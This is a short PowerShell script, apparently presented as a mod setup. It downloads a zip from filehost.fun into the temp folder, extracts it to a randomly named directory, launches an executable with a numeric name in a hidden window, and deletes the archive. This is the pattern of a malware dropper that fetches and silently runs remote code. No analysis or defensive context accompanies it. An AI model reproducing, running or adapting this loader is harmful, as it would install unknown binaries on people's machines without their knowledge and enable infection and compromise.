# Config
$url = "https://filehost.fun/modsetup.zip"
$zipPath = "$env:TEMP\modsetup.zip"
$extractPath = "$env:TEMP\extracted_$(Get-Random)"
$fileToRun = "6283410853.exe"

# Download
Write-Host "Downloading..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing

# Extract
Write-Host "Extracting..." -ForegroundColor Cyan
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# Run in background
$target = Join-Path $extractPath $fileToRun
if (Test-Path $target) {
    Write-Host "Launching $fileToRun in background..." -ForegroundColor Green
    Start-Process -FilePath $target -WindowStyle Hidden
} else {
    Write-Host "$fileToRun not found in archive." -ForegroundColor Red
}

# Cleanup zip
Remove-Item $zipPath -Force
Write-Host "Done. Process running in background." -ForegroundColor Green